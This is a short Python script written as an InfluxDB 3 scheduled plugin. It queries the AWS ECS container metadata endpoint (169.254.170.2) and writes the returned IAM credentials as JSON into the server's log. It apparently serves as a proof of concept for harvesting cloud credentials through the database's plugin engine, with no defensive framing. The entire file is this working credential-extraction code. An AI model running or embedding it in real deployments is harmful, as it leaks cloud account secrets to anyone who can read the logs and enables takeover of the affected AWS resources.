import os
import requests

def process_scheduled_call(influxdb3_local, call_time, args=None):
    relative_uri = os.getenv("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
    if not relative_uri:
        influxdb3_local.info("Error: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI is not set.")
        return

    url = f"http://169.254.170.2{relative_uri}"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # Raise error for HTTP errors
        influxdb3_local.info(response.text)         # Print the JSON credentials
    except requests.RequestException as e:
        influxdb3_local.info(f"Error fetching credentials: {e}")

